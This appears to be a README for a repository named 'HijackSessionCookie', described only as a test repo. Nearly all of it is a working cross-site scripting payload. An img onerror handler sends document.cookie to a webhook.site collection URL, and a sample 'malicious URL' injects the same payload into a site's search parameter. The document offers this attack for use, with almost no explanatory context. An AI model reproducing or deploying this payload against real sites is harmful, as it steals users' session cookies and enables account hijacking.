# HijackSessionCookie
Test Repo

Payload
```
<img src=x onerror="fetch(`https://webhook.site/3cd37862-c917-46b1-b599-ba1c624bc379?${document.cookie}`).then(response => response.json()).then(data => console.log(data)).catch(error => console.error('Error:', error));">
```

Malicious URL
```
https://www.yoursite.com/search?term=<img src=x onerror="fetch(`https://webhook.site/3cd37862-c917-46b1-b599-ba1c624bc379?${document.cookie}`).then(response => response.json()).then(data => console.log(data)).catch(error => console.error('Error:', error));">
```
